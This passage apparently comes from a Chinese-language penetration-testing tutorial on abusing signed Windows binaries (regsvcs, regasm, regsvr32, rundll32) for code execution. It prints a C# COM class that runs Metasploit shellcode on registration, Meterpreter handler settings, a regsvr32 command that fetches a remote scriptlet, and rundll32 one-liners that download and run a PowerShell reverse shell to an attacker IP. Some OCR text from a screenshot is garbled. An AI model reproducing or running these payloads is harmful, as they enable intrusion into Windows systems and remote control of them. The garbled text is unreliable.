> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe
> regsvcs.dll
>
> //Executes UnRegisterClass If you don\'t have permissions
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe /U
> regsvcs.dll
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regasm.exe /U
> regsvcs.dll
>
> //This calls the UnregisterClass Method
>
> \*/
>
> namespace regsvcser
>
> {
>
> public class Bypass : ServicedComponent
>
> {
>
> public Bypass() { Console.WriteLine(\"I am a basic COM Object\"); }
>
> \[ComRegisterFunction\] //This executes if registration is successful
> public static void RegisterClass ( string key )
>
> {
>
> Console.WriteLine(\"I shouldn\'t really execute\"); Shellcode.Exec();
>
> }
>
> \[ComUnregisterFunction\] //This executes if registration fails public
> static void UnRegisterClass ( string key )
>
> {
>
> Console.WriteLine(\"I shouldn\'t really execute either.\");
> Shellcode.Exec();
>
> }
>
> }
>
> public class Shellcode
>
> {
>
> public static void Exec()
>
> {
>
> // native function\'s compiled code
>
> // generated with metasploit
>
> // executes calc.exe
>
> byte\[\] shellcode = new byte\[341\] {
> 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,
>
> 0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,
> 0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,
> 0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,
> 0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,
>
> 0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,
> 0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,
> 0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,
> 0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,
> 0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,
>
> 0x77,0x26,0x07,0x89,0xe8,0xff,0xd0,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,
>
> 0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a,0x68,0x0a,0x64,0x13,0x13,
>
> 0x68,0x02,0x00,0x11,0x5c,0x89,0xe6,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,
>
> 0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,
> 0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x67,
> 0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,
>
> 0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,
>
> 0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,
>
> 0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,
> 0x68,0x00,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,
>
> 0x57,0x68,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x5e,0x5e,0xff,0x0c,0x24,0x0f,0x85,
> 0x70,0xff,0xff,0xff,0xe9,0x9b,0xff,0xff,0xff,0x01,0xc3,0x29,0xc6,0x75,0xc1,
> 0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5 };
>
> UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode.Length,
> MEM_COMMIT, PAGE_EXECUTE_READWRITE);
>
> Marshal.Copy(shellcode, 0, (IntPtr)(funcAddr), shellcode.Length);
> IntPtr hThread = IntPtr.Zero;
>
> UInt32 threadId = 0;
>
> // prepare data
>
> IntPtr pinfo = IntPtr.Zero;
>
> // execute native code
>
> hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
> WaitForSingleObject(hThread, 0xFFFFFFFF);
>
> return;
>
> }
>
> private static UInt32 MEM_COMMIT = 0x1000;
>
> private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
> \[DllImport(\"kernel32\")\]
>
> private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
>
> UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
>
> \[DllImport(\"kernel32\")\]
>
> private static extern IntPtr CreateThread(
>
> UInt32 lpThreadAttributes, UInt32 dwStackSize, UInt32 lpStartAddress,
> IntPtr param,
>
> UInt32 dwCreationFlags, ref UInt32 lpThreadId
>
> );
>
> \[DllImport(\"kernel32\")\]
>
> private static extern UInt32 WaitForSingleObject(
>
> IntPtr hHandle,
>
> UInt32 dwMilliseconds
>
> );
>
> }
>
> }
3、msf 设置
> use exploit/multi/handler
>
> set payload windows/meterpreter/reverse_tcp set LHOST 10.100.19.19
>
> set LHOST 4444
>
> exploit -j
4、微软.NET 框架包含了一个可以在cmd 中运行的VC#
> 编译器并且可以生成恶意的 DLL 文件，key.snk 文件可以用来对生成的DLL
> 作签名。C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe
> /r:System.EnterpriseSe rvices.dll /target:library /out:regsvcs.dll
> /keyfile:key.snk regsvcs.cs
5、执行
> C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\regsvcs.exe
> regsvcs.dll
获得Meterpreter 会话
![](media/image70.jpeg){width="5.879933289588801in"
height="1.7874989063867017in"}
## 15.regsvr32
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法： 工具地址：https://github.com/Hood3dRob1n/JSRat-Py.git
![](media/image71.jpeg){width="5.864694881889764in"
height="0.7791666666666667in"}
1、在kali 上运行JSRat.PY python JSRat.py -i 10.100.19.19 -p 3333
![](media/image72.jpeg){width="5.886686351706037in"
height="1.5170833333333333in"}
2、受害机执行命令 regsvr32.exe /u /n /s
/i:http://10.100.19.19:3333/file.sct scrobj.dll
![](media/image73.jpeg){width="5.861377952755905in"
height="0.609582239720035in"}
3.  kali 成功获取受害机shell
    -   , , . , , . P y t h on I 叩 l 叩 nt ati on
> 切： Hoo d讨Ro b ln
>
> 1 • 1 w 的 女 r ve -
>
> l 盒 I Awaiting C o nn ec 一
>
> I 令 I rundll 12 in voca t i on : ht • .\_,
>
> \...\.....
>
> , / ( onn 氏 t
>
> I•\] Clil\'flt Co 毗 1an d a t : http:
-   L ■ ． 置
> ,ill l / wt f
I \'
> 1 - 1
>
> ht t p: / ■ ■
>
> Serve r a t 一 心 ．．．
>
> 3333/hook
>
> ( • ( I nco
>
> J\'iRat
>
> regsvr32 Invoked Client: 18. 108. 19. 94
>
> ( \'\' ( Us e ‘ 一 的 印 t : Mo z i ll a / 4. 9 C c
>
> a t i.bl e ; 汜 I E 7. 9 ;
>
> o 沁 NT 6 . 1 ; Win64; x64; T r i d 印 t /7 . 8 ;
>
> . NE
>
> . 8 . 5 8 727; SLCC 2;
>
> . BE)
>
> ．戍 T C L.R 3.5.39729;.NET CL.R 3. 9 . 39719 ; " 的 ia Center PC 6.9;
> In fo Pa t h . 3; . NET4 . 8C; 4
>
> JSRat Us 玉 ie 卯t i ons :
>
> [（]{.smallcaps} 颅 ＝\> \[XPClltP r ro vidPd (\" 皿 lnd
>
> ‘ un =\> Run f XI or \ Read rile
>
> uplo.id =\> llplo,td ilP do 叩 l oad =\> Do 中 l o.id I ile
>
> 心 l pt P = ＞ \[)plete F ilp
>
> hP\\p =\> HP l p 压 nu Pxit =\> xii\',hp\\ l
>
> tI 目 拊lI l
![](media/image74.jpeg){width="5.228526902887139in" height="3.41in"}
![](media/image75.jpeg){width="5.880224190726159in" height="1.5675in"}
![](media/image76.jpeg){width="5.720419947506562in"
height="2.933333333333333in"}
## Rundll32
环境： 攻击机：Kali（10.100.18.20） 被攻击机：Windows 2012 R2
（10.100.18.22）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法：
> rundll32 AllTheThings.dll,EntryPoint
>
> rundll32
> javascript:\"\\..\\mshtml,RunHTMLApplication\";o=GetObject(\"script:[http://rev](http://rev/)
> erse-tcp.xyz/payload.sct\");window.close();
>
> rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication
> \";document.write();new%20
> ActiveXObject(\"WScript.Shell\").Run(\"powershell -nop -exec bypass -c
> IEX (New-O bject
> Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/samratas
> hok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\');Invoke-PowerShellTcp
> -Rev erse -IPAddress 10.100.18.20 -Port 3333;\"
>
> rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication
> \";eval(\"w=new%20Active
> XObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");
>
> rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication
> \";document.write();h=new%
> 20ActiveXObject(\"WScript.Shell\").run(\"calc.exe\",0,true);try{h.Send();b=h.ResponseTe
> xt;eval(b);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd
> /c taskkill /f /i m rundll32.exe\",0,true);}
>
> rundll32.exe javascript:\"\\..\\mshtml.dll,RunHTMLApplication
> \";eval(\"w=new%20Active
> XObject(\\\"WScript.Shell\\\");w.run(\\\"calc\\\");window.close()\");
![](media/image77.jpeg){width="5.750239501312336in"
height="4.7792705599300085in"}
![](media/image78.jpeg){width="5.884961723534558in"